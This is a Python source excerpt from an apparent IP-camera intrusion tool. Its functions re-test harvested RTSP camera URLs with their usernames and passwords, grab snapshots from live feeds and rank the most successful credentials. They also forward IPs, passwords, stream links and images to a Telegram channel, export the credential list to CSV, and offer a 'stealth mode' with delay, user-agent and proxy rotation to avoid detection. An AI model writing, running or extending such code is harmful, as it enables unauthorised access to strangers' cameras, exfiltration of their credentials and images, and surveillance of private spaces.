# ─────────────────────────────────────────────────────────────────────────────
# Option 13 › 5 — Quick Re-Test: re-ping + remove dead
# ─────────────────────────────────────────────────────────────────────────────
def _rtsp_quick_retest():
    """
    Quick Re-Test — re-pings every RTSP URL from any selected RTSP file.
    Uses parallel threads.  Live ones get a snapshot, dead ones are removed.
    Any source file that is not RTSP_Tested.txt is treated read-only (no rewrite).
    """
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
    from concurrent.futures import ThreadPoolExecutor, as_completed as _asc

    all_rtsp = _find_all_rtsp_files()
    if not all_rtsp:
        print(f"\n{R}[!] No RTSP files found.  Run a Batch or Single test first.{W}")
        return

    selected = _select_files_prompt(all_rtsp, "Quick Re-Test — Select RTSP File(s)")
    if not selected:
        return

    try:
        _to_s = input(f"{G}Timeout per probe in seconds [2.0]: {W}").strip() or '2.0'
        _probe_timeout = float(_to_s)
    except (ValueError, EOFError, KeyboardInterrupt):
        _probe_timeout = 2.0
    try:
        _th_s = input(f"{G}Parallel threads [30]: {W}").strip() or '30'
        _threads = max(1, min(int(_th_s), 200))
    except (ValueError, EOFError, KeyboardInterrupt):
        _threads = 30
    _flush_stdin()   # discard keystrokes buffered during file-select progress
    try:
        _snap_ans = input(f"{G}Capture JPEG snapshot for re-confirmed live URLs? (y/n) [n]: {W}").strip().lower()
        _do_snap = (_snap_ans == 'y')
    except (EOFError, KeyboardInterrupt):
        _do_snap = False

    # ── Collect all entries from selected files ───────────────────────────────
    entries: list = []
    for fp in selected:
        for e in _parse_rtsp_tested_blocks(fp):
            if e.get('RTSP URL', '').startswith('rtsp://'):
                e['_source_file'] = fp
                entries.append(e)

    total = len(entries)
    if total == 0:
        print(f"\n{R}[!] No RTSP URLs found in selected file(s).{W}")
        return

    print(f"\n{C}{{'═'*64}}{W}")
    print(f"{G}  Quick Re-Test — {total} URLs across {len(selected)} file(s){W}")
    print(f"  Threads : {_threads}   Timeout : {_probe_timeout}s/probe")
    if _do_snap:
        print(f"  Snapshots: enabled → snapshots/")
    print(f"{C}{{'═'*64}}{W}\n")

    _rt_start    = time.time()
    _lock        = threading.Lock()
    _counter     = {'done': 0, 'live': 0, 'dead': 0}
    live_entries: list  = []
    dead_entries: list  = []
    _rt_cred_hits: dict = {}    # "user:pw" → live hit count
    global _retest_active_total, _retest_active_done, _retest_active_live_count
    with _retest_active_lock:
        _retest_active_total      = total
        _retest_active_done       = 0
        _retest_active_live_count = 0

    def _retest_one(entry):
        rtsp_url = entry.get('RTSP URL', '')
        if not rtsp_url:
            return entry, False
        return entry, _rtsp_probe_url(rtsp_url, timeout=_probe_timeout)

    try:
        with ThreadPoolExecutor(max_workers=_threads) as _ex:
            _futs = {_ex.submit(_retest_one, e): e for e in entries}
            for _fut in _asc(_futs):
                entry, is_live = _fut.result()
                rtsp_url = entry.get('RTSP URL', '')
                ip       = entry.get('IP Address', entry.get('IP', '?'))
                ctype    = entry.get('Camera Type', '?')
                cc       = entry.get('Country Code', '??')

                with _lock:
                    _counter['done'] += 1
                    if is_live:
                        _counter['live'] += 1
                    else:
                        _counter['dead'] += 1
                    _pct  = int(_counter['done'] * 100 / total)
                    _fill = int(20 * _pct / 100)
                    _bar  = '\u2588' * _fill + '\u2591' * (20 - _fill)
                    sys.stdout.write(
                        f"\r\033[K{C}\U0001f504 [{_bar}] {_pct}% | "
                        f"{_counter['done']}/{total} | "
                        f"\u2705 {_counter['live']} live | "
                        f"\u274c {_counter['dead']} dead{W}"
                    )
                    sys.stdout.flush()

                    entry['Status']      = 'LIVE' if is_live else 'DEAD'
                    entry['Last Tested'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    if is_live:
                        _snap_path: Optional[str] = None
                        if _do_snap:
                            _snap_path = _capture_rtsp_snapshot(
                                rtsp_url, label=f"{ip.replace('.','_')}_{cc}")
                        live_entries.append(entry)
                        with _retest_active_lock:
                            _retest_active_done       += 1
                            _retest_active_live_count += 1
                        _rt_user = entry.get('Username', entry.get('username', 'admin'))
                        _rt_pw   = entry.get('Password', entry.get('password', ''))
                        _rt_port = int(entry.get('RTSP Port', entry.get('rtsp_port', 554)))
                        print(f"\n  {G}[✓ LIVE]  {ip}  {ctype}  {cc}{W}")
                        print(f"        {Fore.CYAN}{rtsp_url}{Style.RESET_ALL}")
                        if _snap_path:
                            print(f"        {Fore.YELLOW}📸 {os.path.relpath(_snap_path, SCRIPT_DIR)}{Style.RESET_ALL}")
                        # ── Save to per-country live file ─────────────────────
                        _rt_live_file = _save_live_rtsp_entry(
                            ip, rtsp_url, cc, ctype, _rt_user, _rt_pw,
                            _rt_port, _snap_path or '')
                        if _rt_live_file:
                            print(f"        {Fore.GREEN}💾 Saved → {os.path.relpath(_rt_live_file, SCRIPT_DIR)}{Style.RESET_ALL}")
                        _rt_ck = f"{_rt_user}:{_rt_pw}"
                        _rt_cred_hits[_rt_ck] = _rt_cred_hits.get(_rt_ck, 0) + 1
                        record_credential_success(_rt_user, _rt_pw)
                        if TELEGRAM_CONFIG.get("enabled"):
                            _tg = (f"🔄 <b>RTSP Re-Test — Still LIVE!</b>\n"
                                   f"📍 <code>{ip}:{_rt_port}</code>  |  🌍 {cc}  |  📷 {ctype}\n"
                                   f"👤 {_rt_user}  🔑 {_rt_pw}\n"
                                   f"🔗 <code>{rtsp_url}</code>")
                            send_telegram_message(_tg)
                            if _snap_path and os.path.exists(_snap_path):
                                _snap_cap = (f"📸 Re-Test Snapshot\n"
                                             f"📍 {ip}:{_rt_port}  |  🌍 {cc}  |  📷 {ctype}\n"
                                             f"👤 {_rt_user}  🔑 {_rt_pw}\n"
                                             f"🔗 {rtsp_url}")
                                send_telegram_file(_snap_path, _snap_cap)
                    else:
                        dead_entries.append(entry)
                        with _retest_active_lock:
                            _retest_active_done += 1
                        print(f"\n  {R}[\u2717 DEAD]  {ip}  {ctype}  {cc}{W}")

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Re-test interrupted.{W}")

    print()
    _elapsed = max(1, int(time.time() - _rt_start))
    _ts_rt   = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"\n{C}{{'═'*64}}{W}")
    print(f"{G}  Quick Re-Test Complete{W}")
    print(f"  Total re-tested   : {total}")
    print(f"  {G}\u2705 Still live    : {len(live_entries)}{W}")
    print(f"  {R}\u274c Dead / offline : {len(dead_entries)}{W}")
    print(f"  Elapsed           : {_elapsed // 60}m {_elapsed % 60}s")
    print(f"{C}{{'═'*64}}{W}")

    # ── For RTSP_Tested.txt: rewrite keeping only live entries ───────────────
    if _RTSP_TESTER_OUTPUT_FILE in selected:
        _live_from_tested = [e for e in live_entries
                             if e.get('_source_file') == _RTSP_TESTER_OUTPUT_FILE]
        _bak = _RTSP_TESTER_OUTPUT_FILE + '.bak'
        _tmp = _RTSP_TESTER_OUTPUT_FILE + '.tmp'
        try:
            with open(_tmp, 'w', encoding='utf-8') as _of:
                for e in _live_from_tested:
                    _of.write('=' * 60 + '\n')
                    for k in ('IP Address', 'RTSP Port', 'Camera Type', 'Country Code',
                              'Username', 'Password', 'RTSP URL', 'Snapshot',
                              'Status', 'Tested', 'Last Tested'):
                        if k in e and not k.startswith('_'):
                            _of.write(f'{k:<13}: {e[k]}\n')
                    _of.write('=' * 60 + '\n\n')
            if os.path.exists(_RTSP_TESTER_OUTPUT_FILE):
                if os.path.exists(_bak):
                    os.remove(_bak)
                os.rename(_RTSP_TESTER_OUTPUT_FILE, _bak)
            os.rename(_tmp, _RTSP_TESTER_OUTPUT_FILE)
            print(f"\n{G}[\u2713] RTSP_Tested.txt rewritten — {len(_live_from_tested)} live kept.{W}")
            print(f"    Backup saved as RTSP_Tested.txt.bak")
        except Exception as _we:
            print(f"{R}[!] Could not rewrite RTSP_Tested.txt: {_we}{W}")

    # ── Write dead entries to RTSP_Dead.txt ───────────────────────────────────
    if dead_entries:
        _dead_file = os.path.join(SCRIPT_DIR, 'RTSP_Dead.txt')
        try:
            with open(_dead_file, 'a', encoding='utf-8') as _df:
                for e in dead_entries:
                    _df.write('=' * 60 + '\n')
                    for k in ('IP Address', 'RTSP Port', 'Camera Type', 'Country Code',
                              'RTSP URL', 'Last Tested'):
                        if k in e and not k.startswith('_'):
                            _df.write(f'{k:<13}: {e[k]}\n')
                    _df.write('=' * 60 + '\n\n')
            print(f"{Y}[i] {len(dead_entries)} dead entries appended to RTSP_Dead.txt{W}")
        except Exception:
            pass

    # ── Country breakdown from live entries ───────────────────────────────────
    _rt_cc_counts: dict = {}
    _rt_cc_files:  set  = set()
    for _le in live_entries:
        _le_cc = (_le.get('Country Code') or _le.get('country_code') or 'XX').strip()
        _rt_cc_counts[_le_cc] = _rt_cc_counts.get(_le_cc, 0) + 1
        _le_src = _le.get('_source_file', '')
        if _le_src and os.path.exists(_le_src) and _le_src != _RTSP_TESTER_OUTPUT_FILE:
            _rt_cc_files.add(_le_src)
    _rt_cc_sorted   = sorted(_rt_cc_counts.items(), key=lambda x: x[1], reverse=True)
    _rt_cred_sorted = sorted(_rt_cred_hits.items(),  key=lambda x: x[1], reverse=True)

    if _rt_cc_sorted:
        print(f"\n{G}  Live by country:{W}")
        for _rcc, _rcn in _rt_cc_sorted:
            try:
                _rflag = country_flag(_rcc)
            except Exception:
                _rflag = ''
            print(f"    {_rflag} {Y}{_rcc}{W}: {G}{_rcn} live{W}")

    if _rt_cred_sorted:
        print(f"\n{G}  Top credentials (live hits):{W}")
        for _rcr, _rcrn in _rt_cred_sorted[:10]:
            print(f"    {Y}{_rcr:<28}{W} → {G}{_rcrn} win{'s' if _rcrn != 1 else ''}{W}")

    # ── Telegram summary ─────────────────────────────────────────────────────
    if TELEGRAM_CONFIG.get("enabled"):
        _rt_cc_tg = '\n'.join(
            f"  {cc}: <b>{n}</b> live" for cc, n in _rt_cc_sorted
        ) if _rt_cc_sorted else ''
        _rt_cr_tg = '\n'.join(
            f"  <code>{cr}</code> → {crn} win{'s' if crn != 1 else ''}"
            for cr, crn in _rt_cred_sorted[:10]
        ) if _rt_cred_sorted else ''
        send_telegram_message(
            f"\U0001f504 <b>RTSP Quick Re-Test Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Files tested : {len(selected)}\n"
            f"Total URLs   : {total}\n"
            f"✅ Still live  : {len(live_entries)}\n"
            f"❌ Dead removed: {len(dead_entries)}\n"
            + (f"🌍 By country :\n{_rt_cc_tg}\n" if _rt_cc_tg else '')
            + (f"🔑 Top creds  :\n{_rt_cr_tg}\n" if _rt_cr_tg else '')
            + f"🕒 {_ts_rt}"
        )
        if live_entries and os.path.exists(_RTSP_TESTER_OUTPUT_FILE):
            send_telegram_file(_RTSP_TESTER_OUTPUT_FILE,
                               f"📋 RTSP_Tested.txt — {len(live_entries)} live after re-test")
        _dead_fp = os.path.join(SCRIPT_DIR, 'RTSP_Dead.txt')
        if dead_entries and os.path.exists(_dead_fp):
            send_telegram_file(_dead_fp,
                               f"💀 RTSP_Dead.txt — {len(dead_entries)} dead")
        # ── Send each per-country live file in one shot ────────────────────────
        for _rt_clf in sorted(_rt_cc_files):
            if os.path.exists(_rt_clf) and os.path.getsize(_rt_clf) > 0:
                _rt_clf_cc = extract_country_code_from_filename(os.path.basename(_rt_clf))
                _rt_clf_n  = _rt_cc_counts.get(_rt_clf_cc, '?')
                send_telegram_file(
                    _rt_clf, f"🌍 {_rt_clf_cc} — {_rt_clf_n} live RTSP stream(s)")


def export_to_csv(file_path: str = None) -> Optional[str]:
    """Export ValidCamera results to a CSV file for use in Excel / BI tools."""
    G, Y, W, C = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.CYAN
    import csv
    if not file_path:
        files = find_valid_camera_files()
        if not files:
            print(f"{Y}[!] No ValidCamera files found.{W}")
            return None
        if len(files) == 1:
            file_path = files[0]
        else:
            print(f"\n{C}Select file to export:{W}")
            for i, f in enumerate(files, 1):
                print(f"  {Y}{i}.{W} {os.path.basename(f)}")
            try:
                idx = int(input(f"{G}Choice (0=all): {W}").strip())
                if idx == 0:
                    file_path = None   # all
                else:
                    file_path = files[idx - 1]
            except Exception:
                return None

    sources = files if file_path is None else [file_path]
    out_path = os.path.join(SCRIPT_DIR, 'W8_Results.csv')
    rows = []
    for fp in sources:
        cc = extract_country_code_from_filename(os.path.basename(fp))
        try:
            with open(fp, 'r', encoding='utf-8', errors='replace') as _f:
                rec: dict = {}
                for line in _f:
                    line = line.rstrip()
                    def _v(l): return l.split(':', 1)[1].strip() if ':' in l else ''
                    if line.startswith('IP:'):            rec['ip']          = _v(line)
                    elif line.startswith('Port:'):        rec['port']        = _v(line)
                    elif line.startswith('Camera Type:'): rec['device_type'] = _v(line)
                    elif line.startswith('Device Model:'): rec['model']      = _v(line)
                    elif line.startswith('Country Name:'): rec['country']    = _v(line)
                    elif line.startswith('City:'):         rec['city']       = _v(line)
                    elif line.startswith('Username:'):     rec['username']   = _v(line)
                    elif line.startswith('Password:'):     rec['password']   = _v(line)
                    elif line.startswith('RTSP URL:'):     rec['rtsp_url']   = _v(line.replace('RTSP URL:', 'x:'))
                    elif line.startswith('=') and rec.get('ip'):
                        rec.setdefault('country_code', cc)
                        rec.setdefault('flag', country_flag(cc))
                        rows.append(rec)
                        rec = {}
        except Exception:
            pass
    if not rows:
        print(f"{Y}[!] No data to export.{W}")
        return None
    with open(out_path, 'w', newline='', encoding='utf-8-sig') as _csv:
        fieldnames = ['flag','country_code','ip','port','device_type','model',
                      'country','city','username','password','rtsp_url']
        writer = csv.DictWriter(_csv, fieldnames=fieldnames, extrasaction='ignore')
        writer.writeheader()
        writer.writerows(rows)
    print(f"\n{G}[✓] CSV exported: {out_path}  ({len(rows)} rows){W}")
    return out_path


def show_repeat_offenders() -> None:
    """Display the repeat-offender IP registry sorted by sighting count."""
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
    data = load_repeat_offenders()
    if not data:
        print(f"{Y}[!] No repeat offenders recorded yet.{W}")
        return
    ranked = sorted(data.items(), key=lambda x: x[1]['count'], reverse=True)
    print(f"\n{C}{'═'*65}{W}")
    print(f"{G}  Repeat Offender Tracker — {len(data)} persistent IP(s){W}")
    print(f"{C}{'═'*65}{W}")
    for ip, rec in ranked[:40]:
        flag = country_flag(rec.get('country', ''))
        print(f"  {Y}{ip:<16}{W} {flag} seen {G}{rec['count']}x{W}  "
              f"first={rec['first_seen'][:10]}  last={rec['last_seen'][:10]}  "
              f"{C}{rec.get('camera_type','?')[:30]}{W}")


def toggle_stealth_mode() -> None:
    """Toggle the anti-detection stealth mode on or off."""
    global _stealth_mode, _STEALTH_MIN, _STEALTH_MAX
    G, Y, W, C = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.CYAN
    _stealth_mode = not _stealth_mode
    if _stealth_mode:
        print(f"\n{G}[✓] Stealth Mode ON{W} — random delays {_STEALTH_MIN:.2f}s–{_STEALTH_MAX:.2f}s, "
              f"UA rotation, proxy rotation all active.")
        try:
            _mn = float(input(f"{G}  Min delay (s) [{_STEALTH_MIN}]: {W}").strip() or _STEALTH_MIN)
            _mx = float(input(f"{G}  Max delay (s) [{_STEALTH_MAX}]: {W}").strip() or _STEALTH_MAX)
            _STEALTH_MIN = max(0.0, _mn)
            _STEALTH_MAX = max(_STEALTH_MIN, _mx)
        except Exception:
            pass
        print(f"  Delays: {_STEALTH_MIN:.2f}s – {_STEALTH_MAX:.2f}s")
    else:
        print(f"\n{Y}[✓] Stealth Mode OFF{W} — normal speed resumed.")


# ── Tools Sub-menu Helpers ─────────────────────────────────────────────────────

def _find_rtsp_result_files() -> list:
    """Find all .txt result files under RTSP_Results/ directory."""
    results = []
    rtsp_root = os.path.join(SCRIPT_DIR, 'RTSP_Results')
    if not os.path.isdir(rtsp_root):
        return results
    try:
        for root, _, files in os.walk(rtsp_root):
            for f in files:
                if f.endswith('.txt'):
                    results.append(os.path.join(root, f))
    except Exception:
        pass
    return sorted(results)


def _pick_camera_from_valid_files(prompt: str = 'Select target camera') -> Optional[dict]:
    """
    Scan ValidCamera files, show a numbered list of discovered cameras and let
    the user pick one.  Falls back to manual IP/port/cred entry if no files
    are found.  Returns a camera dict or None (user pressed 'b' / back).
    """
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
    files = find_valid_camera_files()
    cameras: list = []
    if files:
        for fpath in files:
            cc = extract_country_code_from_filename(os.path.basename(fpath))
            try:
                with open(fpath, 'r', encoding='utf-8', errors='replace') as _fh:
                    rec: dict = {}
                    for line in _fh:
                        line = line.rstrip()
                        if line.startswith('IP Address:'):
                            rec['ip'] = line.split(':', 1)[1].strip()
                        elif line.startswith('IP:'):
                            rec['ip'] = line.split(':', 1)[1].strip()
                        elif line.startswith('Port:'):
                            try:
                                rec['port'] = int(line.split(':', 1)[1].strip())
                            except ValueError:
                                rec['port'] = 80
                        elif line.startswith('Camera Type:'):
                            rec['camera_type'] = line.split(':', 1)[1].strip()
                        elif line.startswith('Username:'):
                            rec['username'] = line.split(':', 1)[1].strip()
                        elif line.startswith('Password:'):
                            rec['password'] = line.split(':', 1)[1].strip()
                        elif line.startswith('RTSP URL:'):
                            rec['rtsp_url'] = line.split('URL:', 1)[1].strip()
                        elif line.startswith('Country Code:'):
                            rec['country_code'] = line.split(':', 1)[1].strip()
                        elif line.startswith('Country:'):
                            rec.setdefault('country_code',
                                           line.split(':', 1)[1].strip())
                        elif line.startswith('=') and rec.get('ip'):
                            rec.setdefault('country_code', cc)
                            rec.setdefault('camera_type', '')
                            rec.setdefault('username', '')
                            rec.setdefault('password', '')
                            rec.setdefault('port', 80)
                            rec.setdefault('rtsp_url', '')
                            cameras.append(dict(rec))
                            rec = {}
            except Exception:
                pass

    if not cameras:
        print(f"{Y}[!] No ValidCamera files found.{W}")
        print(f"{Y}    Tip: run Option 1 → 2 first to populate camera files.{W}")
        print(f"  {Y}m.{W} Manual input    {Y}b.{W} Back to menu")
        try:
            _nb = input(f"{G}Choice (m / b): {W}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return None
        if _nb not in ('m', 'manual'):
            return None
    else:
        _dlimit = 50
        print(f"\n{C}{'═'*62}{W}")
        print(f"{G}  {prompt}  —  {len(cameras)} camera(s) available{W}")
        print(f"{C}{'═'*62}{W}")
        for i, cam in enumerate(cameras[:_dlimit], 1):
            flag = country_flag(cam.get('country_code', ''))
            ct   = cam.get('camera_type', '')[:18]
            print(f"  {Y}{i:>3}.{W} {flag} {cam['ip']:<16}:{cam['port']:<6}"
                  f"  {G}{cam.get('username','')}{W}:{cam.get('password','')}  "
                  f"{C}{ct}{W}")
        if len(cameras) > _dlimit:
            print(f"  {Y}... and {len(cameras) - _dlimit} more (from ValidCamera files){W}")
        print(f"{C}{'─'*62}{W}")
        print(f"  {Y}m.{W} Manual input    {Y}b.{W} Back to menu")
        print(f"{C}{'═'*62}{W}")
        try:
            ch = input(f"{G}Choice (1-{min(len(cameras), _dlimit)} / m / b): {W}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return None
        if ch in ('b', 'back', ''):
            return None
        if ch not in ('m', 'manual'):
            # accept single number, range (1-5), or comma list (1,3,5)
            _picked_idxs = []
            for _part in ch.replace(' ', '').split(','):
                if '-' in _part:
                    _a, _, _b = _part.partition('-')
                    try:
                        for _n in range(int(_a), int(_b) + 1):
                            if 1 <= _n <= len(cameras):
                                _picked_idxs.append(_n - 1)
                    except ValueError:
                        pass
                else:
                    try:
                        _n = int(_part)
                        if 1 <= _n <= len(cameras):
                            _picked_idxs.append(_n - 1)
                    except ValueError:
                        pass
            if not _picked_idxs:
                print(f"{R}[!] Invalid selection — use a number, range (1-5), "
                      f"or list (1,3,5).{W}")
                return None
            # single-picker: take the first match only
            cam = cameras[_picked_idxs[0]]
            print(f"\n{G}[✓] Selected: {cam['ip']}:{cam['port']}  "
                  f"{cam.get('username','?')}:{cam.get('password','?')}  "
                  f"{cam.get('camera_type','')}{W}")
            return cam

    # ── Manual fallback ────────────────────────────────────────────────────────
    try:
        _ip = input(f"{G}Target IP (or 'b' to back): {W}").strip()
        if _ip.lower() in ('b', 'back', ''):
            return None
        _pt  = input(f"{G}HTTP Port [80]: {W}").strip()
        _usr = input(f"{G}Username: {W}").strip()
        _pwd = input(f"{G}Password: {W}").strip()
        _ct  = input(f"{G}Camera type (blank=Generic): {W}").strip()
        return {
            'ip': _ip,
            'port': int(_pt or 80),
            'username': _usr,
            'password': _pwd,
            'camera_type': _ct,
            'country_code': '',
            'rtsp_url': '',
        }
    except (EOFError, KeyboardInterrupt, ValueError):
        return None


def _tools_wait_back() -> bool:
    """Pause after a tool finishes. Returns True if user presses 'b' to return to menu."""
    G, W = Fore.GREEN, Style.RESET_ALL
    try:
        ch = input(f"\n{G}[Press Enter to continue  |  'b' to return to menu]: {W}").strip().lower()
        return ch in ('b', 'back')
    except (EOFError, KeyboardInterrupt):
        return False


